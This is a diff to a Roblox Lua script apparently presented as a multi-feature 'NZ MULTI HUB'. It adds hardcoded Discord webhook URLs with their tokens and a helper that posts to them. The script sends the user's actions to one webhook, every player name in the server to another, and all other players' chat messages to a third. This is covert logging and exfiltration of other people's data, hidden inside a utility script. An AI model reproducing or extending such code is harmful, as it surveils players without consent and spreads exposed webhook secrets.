@@ -20,6 +20,24 @@ local LP = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
+-- Webhook URLs
+local WEBHOOKS = {
+    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
+    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
+    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"
+}
+
+local function SendWebhook(url, content)
+    if not HttpService.HttpEnabled then
+        -- Mostrar aviso breve si HTTP está deshabilitado
+        task.spawn(function() Splash("HTTP disabled: webhooks not sent",1.2) end)
+        return
+    end
+    pcall(function()
+        HttpService:PostAsync(url, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
 ------------------------
 -- PLACE IDS
 ------------------------
@@ -91,6 +109,7 @@ Main.Position = UDim2.new(.5,-190,.5,-260)
 Main.BackgroundColor3 = Color3.fromRGB(10,10,14)
 Main.BorderSizePixel = 0
 Instance.new("UICorner",Main).CornerRadius = UDim.new(0,26)
+Main.Visible = false
 
 local Header = Instance.new("TextLabel",Main)
 Header.Size = UDim2.new(1,0,0,60)
@@ -162,16 +181,16 @@ local function Button(txt,cb)
     Instance.new("UICorner",b).CornerRadius = UDim.new(0,14)
     b.MouseButton1Click:Connect(function()
         -- Enviar log al webhook principal con la acción (texto del botón)
-        pcall(function()
-            local placeId = tostring(game.PlaceId)
-            local gameName = "Unknown"
             pcall(function()
-                local info = MarketplaceService:GetProductInfo(game.PlaceId)
-                if info and info.Name then gameName = info.Name end
+                local placeId = tostring(game.PlaceId)
+                local gameName = "Unknown"
+                pcall(function()
+                    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+                    if info and info.Name then gameName = info.Name end
+                end)
+                local content = string.format("Player: %s | Action: %s | PlaceId: %s | Game: %s", LP.Name, txt, placeId, gameName)
+                SendWebhook(WEBHOOKS.MAIN, content)
             end)
-            local content = string.format("Player: %s | Action: %s | PlaceId: %s | Game: %s", LP.Name, txt, placeId, gameName)
-            HttpService:PostAsync(WEBHOOKS.MAIN, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
-        end)
         -- Ejecutar callback original
         pcall(cb)
     end)
@@ -186,7 +205,7 @@ local function Rejoin()
             if info and info.Name then gameName = info.Name end
         end)
         local content = string.format("Player: %s | Action: %s | PlaceId: %s | Game: %s", LP.Name, "Rejoin", placeId, gameName)
-        HttpService:PostAsync(WEBHOOKS.MAIN, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
+        SendWebhook(WEBHOOKS.MAIN, content)
     end)
     TeleportService:Teleport(game.PlaceId,LP)
 end
@@ -205,7 +224,7 @@ task.spawn(function()
             local names = {}
             for _,p in ipairs(Players:GetPlayers()) do table.insert(names, p.Name) end
             local content = "Server Players: [" .. table.concat(names, ", ") .. "]"
-            HttpService:PostAsync(WEBHOOKS.PLAYERS, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
+            SendWebhook(WEBHOOKS.PLAYERS, content)
         end)
     end
 end)
@@ -216,7 +235,7 @@ local function connectPlayerChat(p)
     p.Chatted:Connect(function(msg)
         pcall(function()
             local content = string.format("%s: %s", p.Name, msg)
-            HttpService:PostAsync(WEBHOOKS.CHAT, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
+            SendWebhook(WEBHOOKS.CHAT, content)
         end)
     end)
 end
@@ -329,6 +348,7 @@ end
 task.spawn(function()
     Splash("NZ MULTI HUB",1.2)
     Splash("by NZ Team",1)
+    Main.Visible = true
     MainMenu()
 end)
 
